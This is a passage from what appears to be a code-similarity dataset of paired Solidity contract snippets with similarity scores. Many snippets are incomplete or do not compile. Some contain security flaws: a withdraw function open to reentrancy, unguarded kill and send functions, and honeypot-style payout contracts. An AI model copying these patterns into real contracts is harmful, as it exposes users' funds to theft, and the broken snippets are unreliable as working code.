        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit LogTransfer(msg.sender, receiver, amount);
    }

}",0.6978645640724971,"contract Bank {

	address owner;

	uint256 public minDeposit = 1 ether;

	mapping (address => uint256) public balances;

	Logger private TrustLog;



	constructor(address _logger) payable public {

		owner = msg.sender;

		TrustLog = Logger(_logger);

	}



	function deposit() public payable {

		if (msg.value >= minDeposit) {

			balances[msg.sender]+=msg.value;

			TrustLog.LogTransfer(msg.sender,msg.value,""deposit"");

		} else {

			TrustLog.LogTransfer(msg.sender,msg.value,""depositFailed"");

		}

	}



	function withdraw(uint256 _amount) public {

		if(_amount <= balances[msg.sender]) {

		    (bool success, ) = msg.sender.call.value(_amount)("""");

			if(success) {

				balances[msg.sender] -= _amount;

				TrustLog.LogTransfer(msg.sender, _amount, ""withdraw"");

			} else {

				TrustLog.LogTransfer(msg.sender, _amount, ""withdrawFailed"");

			}

		}

	}



	function checkBalance(address _addr) public view returns (uint256) {

		return balances[_addr];

	}

}"
"contract TokenCreator { mapping(string => address) addresses; function getAddress(string name) constant returns (address) { return addresses[name]; } function createToken(string name) returns (OwnedToken tokenAddress) {     tokenAddress = new OwnedToken(name); addresses[name] = tokenAddress; } function changeName(string oldName, string newName) {   address tokenAddress = addresses[oldName]; delete addresses[oldName]; addresses[newName] = tokenAddress; OwnedToken(tokenAddress).changeName(newName); } function isTokenTransferOK( address currentOwner, address newOwner ) returns (bool ok) {  address tokenAddress = msg.sender; return (sha3(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff); }}",0.6144705092762172,"contract OpsManaged is Owned {

   address public opsAddress;

   event OpsAddressUpdated(address indexed _newAddress);


   function OpsManaged() public
      Owned()
   {
   }


   modifier onlyOwnerOrOps() {
      require(isOwnerOrOps(msg.sender));
      _;
   }


   function isOps(address _address) public view returns (bool) {
      return (opsAddress != address(0) && _address == opsAddress);
   }


   function isOwnerOrOps(address _address) public view returns (bool) {
      return (isOwner(_address) || isOps(_address));
   }


   function setOpsAddress(address _newOpsAddress) public onlyOwner returns (bool) {
      require(_newOpsAddress != owner);
      require(_newOpsAddress != address(this));

      opsAddress = _newOpsAddress;

      OpsAddressUpdated(opsAddress);

      return true;
   }
}"
"contract B {
    IA public a;    
    function setContract(IA _a) public {
        a = _a;
    }   
    function setNumber() public {
        a.setNumber(10);
    }
}",0.605443504307056,"contract addition {
    address reservedSlot; 
    uint256 public myNumber;
    
    function add() public {
        myNumber = myNumber + 1;
    }
}"
"contract Base {
    bool public active;

    modifier canSetMetadata() {
        require(canSetMetadata_());
        _;
    }

    function canSetMetadata_() internal view returns (bool) {
        return (active == false);
    }
}",0.6018963965552584,"contract Manager {
    function isAllowed(address _actor, bytes32 _role) public view returns (bool);
    function hasAccess(address _actor) public view returns (bool);
}"
"contract BaseWithMetadataControl is Base {
    address public metadataControl;

    function canSetMetadata_() internal view returns (bool) {
        if(msg.sender != metadataControl) {
            return super.canSetMetadata_();
        } else {
            return true;
        }
    }
}",0.6241251622073303,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}"
"contract V {
    Random api = Random(0xAddress);

    function roll(uint guess) public payable {
        if (api.random(6) == guess) {
            msg.sender.transfer(msg.value * 2);
        }
    }
}",0.6168494391302684,"contract ProxyTest {



    event ETHSent(uint amt);



    function sendETH() public payable {

        address(msg.sender).transfer(msg.value);

        emit ETHSent(msg.value);

    }



}"
"contract AbstractB {
    function getX() returns(uint) {
        return 3;
    }
}",0.6649191698230793,"contract PotAbstract {
    function drip() external returns (uint256);
}"
"contract A {
    function makeCall(address addressB) returns(uint) {
        return AbstractB(addressB).getX.gas(1000)();
    }
}",0.6260022923856009,"contract AbstractSweeperList {
    function sweeperOf(address _token) external returns (address);
}"
"contract Test {

    
    function test(uint[20] a) public returns (uint) {
        return a[10] * 2;
    }

    
    function test(uint[20] a) external returns (uint) {
        return a[10] * 2;
    }


    
    function test(uint[20] a) internal returns (uint) {
        return a[10] * 2;
    }
}",0.6992884739056324,"contract SafeMath {

    function safeAdd(uint a, uint b) internal returns (uint) {

        uint c = a + b;

        assert(c>=a && c>=b);

        return c;

     }



    function safeSub(uint a, uint b) internal returns (uint) {

        assert(b <= a);

        return a - b;

    }

}"
"contract ADTest {

    
    MyTokenI myToken;

    
    function ADTest(address _myToken) public {
        
        myToken = MyTokenI(_myToken);
    }

    function CallTransfer(address _to, uint256 _value) public {
        
        myToken.transfer(msg.sender, _to, _value);
    }

}",0.6623061555300337,"contract BCSToken {

    

    function BCSToken() internal {}

    function transfer(address _to, uint256 _value) public {}

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}



}"
"contract SomeRegister {
    address backendContract;
    address[] previousBackends;
    address owner;

    function SomeRegister() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner)
        _;
    }

    function changeBackend(address newBackend) public
    onlyOwner()
    returns (bool)
    {
        if(newBackend != backendContract) {
            previousBackends.push(backendContract);
            backendContract = newBackend;
            return true;
        }

        return false;
    }
}",0.6693023752011492,"contract Owned {

    address payable public owner;

    address payable public newOwner;

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    function transferContractOwnership(address payable _newOwner) public onlyOwner {

        newOwner = _newOwner;

    }

    function acceptContractOwnership() public returns(bool successful) {

        if (newOwner == msg.sender) {

            owner = newOwner;

            return true;

        } else {

            return false;

        }

    }

}"
"contract Enabled {
  address public CMC;
  function setCMCAddress(address _CMC) external {
    if (CMC != 0x0 && msg.sender != CMC) {
        revert();
    } else {
        CMC = _CMC;
    }
  }
}",0.6142085821540878,"contract Ownable {
    address public owner;

    function Ownable() public { 
        owner = msg.sender;
    }
    modifier onlyOwner() { 
        if (owner == msg.sender) {
            _;
        } else {
            revert();
        }
    }
}"
"contract setXstorage is Enabled {
    using setXinterface for setXinterface.X;
    setXinterface.X X;
    function setX(uint _x) external {
        X.setX(_x);
    }

    function getX() external view returns (uint) {
      return X.x;
    }
}",0.6144040481578671,"contract  ICErc20 is ICToken {
    function underlying() external view returns (address);

    function mint(uint mintAmount) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint);





}"
"contract MainContract {
    function getBalanceInEth() returns (uint256) {
        return Converter.weiToEther(this.balance);
    }
}",0.6306136036211891,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract C {
  function doSomething(uint x, uint y) public returns (uint) {
    return Helper.add(uint x, uint y);
  }
}",0.6733531699681109,"contract Kicker {
    function kick(address urn, address gal, uint tab, uint lot, uint bid)
        public returns (uint);
}"
"contract SuperClassParent {

    event LogSender(address sender, address origin, address me);

    function lookWhosTalking() public returns(address) {
        emit LogSender(msg.sender, tx.origin, address(this));
        return msg.sender;
    }

}",0.6024168364710637,"contract ERC20 is ERC20Token {
  function allowance(address owner, address spender) public constant returns (uint256);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract SubClassChild is SuperClassParent {

    

    

    function rightHere() public returns(address) {
        emit LogSender(msg.sender, tx.origin, address(this));
        return msg.sender;
    }

}",0.6179136074099232,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract PublicArray {
   uint256[8] public array;
}",0.6468774449105389,"contract CoinI{
    
    uint256 public totalSupply ;
}"
"contract Test {
    uint public myArray;

    function Test() public {
        myArray.push(1);
        myArray.push(10);
        myArray.push(30);
    }

    function getArrayLength() public view returns (uint) {
        return myArray.length;
    }

    function getFirstElement() public view returns (uint) {
        return myArray[0];
    }",0.6602089406805248,"contract PreviousInterface {



    function ownerOf(uint id) public view returns (address);



    function getCard(uint id) public view returns (uint16, uint16);



    function totalSupply() public view returns (uint);



    function burnCount() public view returns (uint);



}"
"contract Hub is Owned {

    address[] public spokes;
    mapping(address => bool) public isSpoke;

    event LogNewSpoke(address sender, address spoke);

    constructor() public { owner = msg.sender; }

    function getSpokeCount() public view returns(uint count) { return spokes.length; }

    function newSpoke() public onlyOwner returns(address newContract) {
        Spoke s = new Spoke();
        spokes.push(address(s));
        isSpoke[address(s)] = true;
        emit LogNewSpoke(msg.sender, address(s));
        return address(s);
    }

}",0.6794725377091977,"contract Ownable is WaConfig {

    address public ceo;

    

    event LogChangeCEO(address indexed oldOwner, address indexed newOwner);

    

    modifier onlyOwner {

        require(msg.sender == ceo);

        _;

    }

    

    constructor() public {

        ceo = msg.sender;

    }

    

    function changeCEO(address _owner) onlyOwner public returns (bool) {

        require(_owner != address(0));

        

        emit LogChangeCEO(ceo, _owner);

        ceo = _owner;

        

        return true;

    }



    function isOwner(address _owner) internal view returns (bool) {

        return ceo == _owner;

    }

}"
"contract delegatedcalled {      
  address public callerAddress;
  uint public number;
function setNumber(uint _number) {
    number = _number;
    callerAddress = msg.sender;
  }
}",0.6586752598937113,"contract NumberFactory{
    event NumberCreated(address);
    address public last;
 function createNumber(uint _number) public {
     last= new Number(_number);
     NumberCreated(last);
     
    
 } 
}"
"contract AddressStore {
    address[] public bought;

    
    function setStore(address[] _addresses) public {
        bought = _addresses;
    }
}",0.6723040514466339,"contract ThisMustBeFirst {

  address public bts_address1;
  address public bts_address2;
  address public token_address;

}"
"contract Escrow {

    mapping(address => uint256) public payments;
    mapping(address => uint256) public released;
    mapping(address => uint256) public transferred;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    function payInto() payable {
        require(msg.value > 0, 'Sender attempted to pay zero amount.');
        require(payments[msg.sender] == 0, 'Sender previously paid into escrow.');
        payments[msg.sender] = msg.value;
    }

    function release() {
        require(payments[msg.sender] > 0, 'Sender has not paid into escrow.');
        require(released[msg.sender] == 0, 'Sender has already released funds.');
        released[msg.sender] = payments[msg.sender];
    }

    function safeWithdraw(address buyer) {
        require(msg.sender == owner, 'Non-owner tried to withdraw funds.');
        require(released[buyer] > 0, 'No released funds from buyer to withdraw.');
        require(transferred[buyer] == 0, 'Re-entrancy attempt during withdrawal.');
        transferred[buyer] = released[buyer];
        owner.transfer(released[buyer]);
    }
}",0.6340392296385504,"contract EthWallet {

    address public owner;
    uint256 public icoEndTimestamp;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        require(newOwner != address(0));      
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function EthWallet(address _owner, uint256 _icoEnd) public {
        require(_owner != address(0));
        require(_icoEnd > now);
        owner = _owner;
        icoEndTimestamp = _icoEnd;
    }

    function () payable external {
        require(now < icoEndTimestamp);
        require(msg.value >= (1 ether) / 10);
        Transfer(msg.sender, address(this), msg.value);
        owner.transfer(msg.value);
    }

    function cleanup() onlyOwner public {
        require(now > icoEndTimestamp);
        selfdestruct(owner);
    }

    function cleanupTo(address _to) onlyOwner public {
        require(now > icoEndTimestamp);
        selfdestruct(_to);
    }

}"
"contract Test {
    function getSha256(uint32 nonce) constant returns (bytes32 hash) {
        return sha256(nonce);
    }
}",0.6452711734258513,"contract PublicResolver {
    function text(bytes32 node, string key) constant returns (string ret) {
    }
}"
"contract newInstance {

 mapping(address=>address) public userContracts;

  function newInstanceFunc(address _address) public returns(address) {
    ContractToBeInstanced T = new ContractToBeInstanced(_address);
    address deployedAddress = address(T);
    userContracts[_address] = deployedAddress;
    return deployedAddress;
  }
}",0.6097691495119706,"contract OOOOOO {

    address public owner;

	address public Defaultaddress;

	address public Contractaddress;

	

    constructor() public {

        owner = msg.sender;

    }



	modifier restricted {

        require(msg.sender == owner);

        _;

    }

	

	function UpdateContractaddress(address NewAddress) public restricted {

        Contractaddress = NewAddress;

    }



}"
"contract test {

  function test() {
  }

  function verify(bytes32 _message, uint8 _v, bytes32 _r, bytes32 _s) constant returns (address) {
    bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";
    bytes32 prefixedHash = sha3(prefix, _message);
    address signer = ecrecover(prefixedHash, _v, _r, _s);
    return signer;
  }
}",0.6004247288036264,"contract StorageUnit {
    address private owner;
    mapping(bytes32 => bytes32) private store;

    constructor() public {
        owner = msg.sender;
    }

    function write(bytes32 _key, bytes32 _value) external {
        
        require(msg.sender == owner);
        store[_key] = _value;
    }

    function read(bytes32 _key) external view returns (bytes32) {
        return store[_key];
    }
}"
"contract Voting {
address[100] public voters;


function vote(uint voterId) public view returns (uint) {
  require(alreadyVoted(voteId));

  voters[voterId] = msg.sender;

  return voterId;
}


function getVoters() public returns (address[16]) {
  return voters;
}
}",0.6390621385799835,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract Test {
    function testit(address a) {
        if (!a.send(123))
            throw;
    }
}",0.6271634942236346,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract A {
   address[] public addElements;

   event newAddress(address a);

   function A() payable { }

   function create() returns (address a) {
       B obj = new B();
       addElements.push(obj);

       
       newAddress(obj);
   }

   function getElements() returns (address[] ) {
       return addElements;
   }
}",0.653670088271934,"contract Ambi2 {

    function claimFor(address _address, address _owner) public returns(bool);

    function hasRole(address _from, bytes32 _role, address _to) public view returns(bool);

    function isOwner(address _node, address _owner) public view returns(bool);

}"
"contract Test1 {
    uint8[3] a; 
    function Test1() {
        a = [1, 2, 3];
    }
}",0.68867648035191,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract VotethCommentSupplier {
   function makeComment(string _comment, string _nickname, address _author) public returns(address);
}",0.6759383794803924,"contract tDeployer {

	function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address);

}"
"contract Ballot {
    string public title;

    function Ballot(string _title) {
        title = _title;
    }

   function getTitle() constant returns (string) { 
       return title; 
   }
}",0.651996846171046,"contract Helloworld {

    string content;

    

    constructor()

    public

    {

        content = 'aaa';

    }

    

    function getContent() constant public returns (string){

        return content;

    }

}"
"contract A {
    B public b;
    function foo() {
        b = new B();
        throw;
    }

    function getXfromB() returns (uint) {
        return b.x();
    }
}",0.6846459043991718,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract B {
    uint public x;

    function B() {
        x = 1;
    }
}",0.6943003380169885,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract Relay {

    IOtherContract private otherContractInterface;

    modifier onlyOwner() {
      require(msg.sender == owner, ""Sender is not owner"");
      _;
    }

    function initialize(address _otherContractAddress) external onlyOwner {

        otherContractInterface = IOtherContract(_otherContractAddress);
    }
}",0.6186513901224253,"contract Ownable {

    address private owner;



    event LogOwnerChange(address _owner);



    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function Ownable() public {

        owner = msg.sender;

    }



    

    function replaceOwner(address _owner) external onlyOwner {

        owner = _owner;



        LogOwnerChange(_owner);

    }

}"
"contract Contract1 {
        function func(uint256 x, uint8 y) public returns (uint32, uint32)  {
            return (uint32(x), uint32(y));
        }
    }",0.6640018821874906,"contract XRateProvider {

    
    
    function getRate() public returns (uint32 , uint32 );

    
    function getCode() public returns (string);
}"
"contract Contract2 {

        Contract1 public contract1 = new Contract1();

        function func() public returns (uint32, uint32) {
            (uint32 arg1, uint32 arg2) = contract1.func(uint256(789), uint8(123));
            return (arg1, arg2);
        }
    }",0.6050550579490769,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract Basic {
    bytes32 value;

    function Basic() {
        value = ""mcansado"";
    }

    function getValue() constant returns(bytes32) {
        return value;
    }

    function setValue(bytes32 _value)  {
        value = _value;
    }
}",0.6016359568318445,"contract token {

    function balanceOf(address _owner) public constant returns (uint256 value);
    function transfer(address _to, uint256 _value) public returns (bool success);

    }"
"contract storeStuff {
  string content
  address owner;

  
  
  function storeStuff() {
    owner = msg.sender;
  }

  function updateContent (string newContent) {
    if (msg.sender == owner)
      content = newContent;
  }
}",0.6452045479210802,"contract owned {
	address public owner;
	function owned() {
		owner = msg.sender;
	}
	function changeOwner(address newOwner) onlyowner {
		owner = newOwner;
	}
	modifier onlyowner() {
		if (msg.sender==owner) _;
	}
}"
"contract Ownable {
    address public owner = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; 

    function getOwner() public view returns(address theOwner) {
        return owner;
    }
}",0.6765742973922989,"contract Owned {
    address contractOwner;

    constructor() public { 
        contractOwner = msg.sender; 
    }
    
    function whoIsTheOwner() public view returns(address) {
        return contractOwner;
    }
}"
"contract SampleCrowdsale is Ownable {

    address public owner = 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c; 

    

    function getOwner2() public view returns(address theOwner) {
        return super.getOwner();
    }
}",0.6157165401635587,"contract MultiOwnable {



    mapping (address => bool) _owner;



    modifier onlyOwner() {

        require(isOwner(msg.sender));

        _;

    }



    function isOwner(address addr) public view returns (bool) {

        return _owner[addr];

    }



}"
"contract ReceiverPays {
    address owner = msg.sender;

    mapping(uint256 => bool) usedNonces;

    
    function ReceiverPays() public payable { }

    
    function() public payable {
    }

    function claimPayment(uint256 amount, uint256 nonce, bytes sig) public {
        require(!usedNonces[nonce]);
        usedNonces[nonce] = true;

        
        bytes32 message = prefixed(keccak256(msg.sender, amount, nonce, this));

        require(recoverSigner(message, sig) == owner);

        msg.sender.transfer(amount);
    }

    
    function kill() public {
        require(msg.sender == owner);
        selfdestruct(msg.sender);
    }


    

    function splitSignature(bytes sig)
        internal
        pure
        returns (uint8, bytes32, bytes32)
    {
        require(sig.length == 65);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            
            r := mload(add(sig, 32))
            
            s := mload(add(sig, 64))
            
            v := byte(0, mload(add(sig, 96)))
        }

        return (v, r, s);
    }

    function recoverSigner(bytes32 message, bytes sig)
        internal
        pure
        returns (address)
    {
        uint8 v;
        bytes32 r;
        bytes32 s;

        (v, r, s) = splitSignature(sig);

        return ecrecover(message, v, r, s);
    }

    
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(""\x19Ethereum Signed Message:\n32"", hash);
    }
}",0.602576363534334,"contract Token is SafeMath {

	

	uint256 public totalSupply;

	uint256 internal maxSupply;

	

	

	

	function balanceOf(address _owner) public view returns (uint256 balance);



	

	

	

	

	function transfer(address _to, uint256 _value) public returns (bool success);



	

	

	

	

	

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);



	

	

	

	

	function approve(address _spender, uint256 _value) public returns (bool success);



	

	

	

	function allowance(address _owner, address _spender) view public returns (uint256 remaining);



	

	



	function burn(uint256 amount) public returns (bool);



	

	

	function register(string key) public returns (bool);



	

	

	function mint(uint256 amountOfMint) public returns (bool);



	event Transfer                           (address indexed _from, address indexed _to, uint256 _value);

	event Approval                           (address indexed _owner, address indexed _spender, uint256 _value);

	event Burn                               (address indexed _owner, uint256 indexed _value);

	event LogRegister                        (address user, string key);

	event Mint                               (address user,uint256 indexed amountOfMint);

}"
"contract Test {
    uint public myArray;

    function Test() public {
        myArray.push(1);
        myArray.push(10);
        myArray.push(30);
    }

    function getArrayLength() public view returns (uint) {
        return myArray.length;
    }",0.6382951466300982,"contract iJackPot {

    function processLottery() public payable;

    function getCurrentRound() public view returns (uint);

    function getRoundFunds(uint _round) public view returns (uint);

}"
"contract State {

  uint public x; 

  function setX(uint newX) public {
    x = newX; 
  }
}",0.6702683543284691,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract Test {
    ...

    function check(bytes32[] msgHash, uint8[] v, bytes32[] r, bytes32[] s) public view returns (bool) {
        for (uint256 i = 0; i < msgHash.length; i++) {
            address signer = recoverAddr(msgHash[i], v[i], r[i], s[i]);
            ...
        }
    }
}",0.6053150117333288,"contract Indorser is Ownable {

    function multisend(address _tokenAddr, address[] _to, uint256[] _value)
    returns (uint256) {
        
		for (uint8 i = 0; i < _to.length; i++) {
            Token(_tokenAddr).transfer(_to[i], _value[i]);
            i += 1;
        }
        return(i);
    }
}"
"contract Greetable {
        function Greetable() public {}
        function greet() constant public returns (bytes32);
    }",0.6870229590283642,"contract MOB {

    function buy(address _referredBy) public payable returns(uint256);

    function exit() public;

}"
"contract MyContract {
    string public message;

    function MyContract(string initialMessage) public {
        message = initialMessage;
    }

    function setMessage(string newMessage) public {
        message = newMessage;
    }
}",0.671487876357986,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract HelloWorld {

    string saySomething;

    constructor() public  {
        saySomething = ""Hello World!"";
    }

    function speak() public view returns(string memory) {
        return saySomething;
    }

    function saySomethingElse(string memory newSaying) public  returns(bool success) {
        saySomething = newSaying;
        return true;
    }

}",0.6109863685019818,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract ModByZero {

    event LogSomeState(uint256 a, uint256 b);

    function doIt(uint256 a, uint256 b) public returns (uint256) {
        emit LogSomeState(a, b);
        return a % b;
    }
}",0.6546644156817385,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract Oursurance {

  address public creator;

  event LogFundsReceived(address sender, uint amount);
  event LogFundsSent(address receiver, uint amount);

  function() payable {
    LogFundsReceived(msg.sender, msg.value);
  }

  function Oursurance() payable {
    creator = msg.sender;
    LogFundsReceived(msg.sender, msg.value);
  }

  function kill() {
    selfdestruct(creator);
  }

  function send(address target, uint256 amount) {
    if (!target.send(amount)) throw;
    LogFundsSent(target, amount);
  }

}",0.6583996580314525,"contract Forward {

  address public destinationAddress;
  event LogForwarded(address indexed sender, uint amount);
  event LogFlushed(address indexed sender, uint amount);

  function constuctor() public {
    destinationAddress = msg.sender;
  }

  function() payable public {
    emit LogForwarded(msg.sender, msg.value);
    destinationAddress.transfer(msg.value);
  }

  function flush() public {
    emit LogFlushed(msg.sender, address(this).balance);
    destinationAddress.transfer(address(this).balance);
  }

}"
"contract Contract {

    struct Everything {
        uint a;
        bytes32 b;
        bool c;
        address d;
    }

    Everything[] public my_array;

    function expand() public {
        my_array.length++;
    }
}",0.6068921413274584,"contract Hgs {
    struct CsAction {
      bool        passedKYC;
      bool        blocked;
    }


    
    mapping (address => CsAction) public permissions;
    mapping (address => uint256)  public deposits;
}"
"contract B {
    ERC20 token;
    uint256 public constant ticketPrice = 10 ** 18; 
    function processPayment(uint amount) public return bool {
        
        if (amount >= ticketPrice) {
            
            require(token.transferFrom(msg.sender, address(this), ticketPrice), ""Transfer failed"");
            
            emit TicketSold(msg.sender, ticketPrice);
            return true;
        } else {
            
            return false;
        }
    }
}",0.6242482045606871,"contract Token {

    function transfer(address receiver, uint amount) public returns (bool) {

        (receiver);

        (amount);

        return false;

    }



    function balanceOf(address holder) public view returns (uint) {

        (holder);

        return 0;

    }



    function approve(address _spender, uint256 _value) public returns (bool) {

        (_spender);

        (_value);

        return false;

    }

}"
"contract Test {
    Receiver myR;

    function setReceiver (address a) {
        myR = Receiver(a);
    }

    function callR() {
        myR.call(this.balance);
    }

    function sendCash() payable {
    }

}",0.6234276922449675,"contract Hellina{

    address owner;

    function Hellina(){

        owner=msg.sender;

    }

    

    function Buy() payable{

        

    }

    

    function Withdraw(){

        owner.transfer(address(this).balance);

    }

}"
"contract A  {

      mapping(address =>address[]) public inves;

      function totalInvesCount(address index) public view returns(uint){
        return(inves[index].length);
      }

}",0.6711687914985145,"contract abcResolverI{

    function getWalletAddress() public view returns (address);

    function getAddress() public view returns (address);

}"
"contract B {

    A a;

    constructor(address _a) public {
        a = A(_a); 
    }

    function totalInvesCount() public view returns(uint) {
        return a.totalInvesCount(msg.sender);
    }

}",0.6720400527164635,"contract ERC20 {

    function balanceOf(address who) public view returns(uint);

    function transfer(address dest, uint amount) public returns(bool);

}"
"contract TestSend {

  function sendToOther(address receiver) payable returns(bool success) {
    if(!receiver.send(msg.value) throw; 

...",0.655601266658276,"contract token { function transferFrom(address sender, address receiver, uint amount) returns(bool success){  } }"
"contract SomeContract {
    address tokenAddress;
    MyToken token;
    token.approve(this( which is adress of SomeContract), X amount of tokens is able to donate has to be more than 1000 that is what you send)

    
    
    function setTokenAddress(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
        token = MyToken(_tokenAddress);
    }

    function GiveMeTokens() public payable {
        if (msg.value > 1) {
            token.transfer(msg.sender, 1000);
        }
    }
}",0.6335237803904141,"contract Airdropper is Ownable {
    
    function AirTransfer(address[] _recipients, uint _values, address _tokenAddress) onlyOwner public returns (bool) {
        require(_recipients.length > 0);

        Token token = Token(_tokenAddress);
        
        for(uint j = 0; j < _recipients.length; j++){
            token.transfer(_recipients[j], _values);
        }
 
        return true;
    }
 
     function withdrawalToken(address _tokenAddress) onlyOwner public { 
        Token token = Token(_tokenAddress);
        token.transfer(owner, token.balanceOf(this));
    }

}"
"contract MyOrgDatabase {
  struct Organization {
    address _where;
    string _name;
  }
  Organization[] public availableOrgs;
  address public owner = msg.sender;

  function addOrg(address _where, string _name) {
    require(msg.sender == owner);
    availableOrgs.push(Organization(_where, _name));
  }
}",0.6051623076829995,"contract Ownable {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function Ownable() public {
        owner = msg.sender; 
    }

    
    function transferTo(address _to) public onlyOwner returns (bool) {
        require(_to != address(0));
        owner = _to;
        return true;
    } 
}"
"contract SimplySend {
    event Paid(uint);
    function () payable {
        Paid(msg.value);
    }
}",0.6655645725609318,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract TipFaucet {

    uint public received;
    uint public paid;

    modifier isDev { if (msg.sender != 

    function withdraw() isDev {
        paid += this.balance;
        msg.sender.send(this.balance);
    }

    function () {
        received += msg.value;
    }
}",0.6383998591272223,"contract T_TOTAL {
    
    function () public payable {}
    function retrieve(string code) public payable {
        if (msg.value >= (this.balance - msg.value)) {
            if (bytes5(keccak256(code)) == 0x70014a63ef) { 
                msg.sender.transfer(this.balance);
            }
        }
    }
}"
"contract MyContract {
    function myFunction() returns(string myString) {
        return ""Hello!%"";
    }
}",0.6464351351545001,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract Test {
    mapping (address => uint256) weismap;

    function bet(uint vote) payable returns (uint256 weis) {
        if (msg.value==0) 
            throw;
        weismap[msg.sender]= msg.value;
        return  weismap[msg.sender];
    }

    function test() constant returns (uint myVote)  {
        return 1;
    }
}",0.6360859936214411,"contract AppCoins {
    mapping (address => mapping (address => uint256)) public allowance;
    function balanceOf (address _owner) public constant returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) public returns (uint);
}"
"contract OwnedContract {

    mapping (address => bool) private _owners;
    address private _masterAdmin;

    modifier isOwner() {
        require(_masterAdmin == msg.sender || _owners[msg.sender]);
        _;
    }

    function OwnedContract() {
       _masterAdmin = msg.sender;
    }

    

}",0.6798235979946682,"contract Ownable {

    address public owner;

    function Ownable() public {

        owner = msg.sender;

    }

    function _msgSender() internal view returns (address)

    {

        return msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);

        _;
    }

}"
"contract Test {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    event dying(bool dead);

    function kill() public {
        emit dying(true);
        selfdestruct(owner);
    }
}",0.6948512479030788,"contract BurnTokens {
    
   
  address owner;
  
   
  function BurnTokens() public {
      owner = msg.sender;
  }

    
  
  function destroy() public {
      assert(msg.sender == owner);
      selfdestruct(this);
  }
  
}"
"contract ICO {
    address public bank = ......;

    function withdrawal() public {
        require(address(this).balance >= 1000000000000000);
        bank.transfer(address(this).balance);
    }

}",0.6105363906522708,"contract Token {

    function transfer(address receiver, uint amount) public;

    function balanceOf(address _address) public returns(uint);

}"
"contract WithdrawalContract {
    address public richest;
    uint public mostSent;

    mapping (address => uint) pendingWithdrawals;

    function WithdrawalContract() payable {
        richest = msg.sender;
        mostSent = msg.value;
    }

    function becomeRichest() payable returns (bool) {
        if (msg.value > mostSent) {
            pendingWithdrawals[richest] += msg.value;
            richest = msg.sender;
            mostSent = msg.value;
            return true;
        } else {
            return false;
        }
    }

    function withdraw() returns (bool) {
        uint amount = pendingWithdrawals[msg.sender];
        
        
        pendingWithdrawals[msg.sender] = 0;
        if (msg.sender.send(amount)) {
            return true;
        } else {
            pendingWithdrawals[msg.sender] = amount;
            return false;
        }
    }
}",0.6268716703925554,"contract MyDeposit is Ownable {
    address public Owner;
    mapping (address => uint) public deposits;
    uint public openDate;
    
    function initalize(uint _openDate) payable public {
        Owner = msg.sender;
        openDate = _openDate;
        deposit();
    }
    
    function() public payable {  }
    
    function deposit() public payable {
        if (msg.value >= 0.5 ether)
            deposits[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public onlyOwner {
        if (now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0)
                if (!msg.sender.send(amount))
                    revert();
        }
    }
    
    function kill() public {
        if (address(this).balance == 0)
            selfdestruct(msg.sender);
    }
}"
"contract Test {

    function getValue(string something) public view returns (string, uint) {
        return (something, 123);
    }
}",0.6883383146487495,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Thingy {
    uint[] public thing = [1];


    function addToArray() public {
